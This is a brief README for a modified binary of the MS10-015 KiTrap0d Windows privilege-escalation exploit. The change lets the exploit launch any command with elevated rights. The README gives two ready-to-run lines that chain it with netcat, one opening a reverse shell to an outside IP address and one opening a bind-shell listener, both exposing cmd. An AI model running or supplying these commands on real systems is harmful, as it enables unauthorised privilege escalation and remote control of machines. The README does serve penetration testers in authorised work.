# MS10-015_kitrap0d
MS10-015 KiTrap0d (exploitdb-id:11199) modified binary that start any command instead of forking a command prompt. This can be used to start netcat as either tcp reverse shell or listener.

** Reverse shell

vdmallowed nc 10.11.22.33 2869 -e cmd

** Listener

vdmallowed nc -nvlp 2869 -e cmd

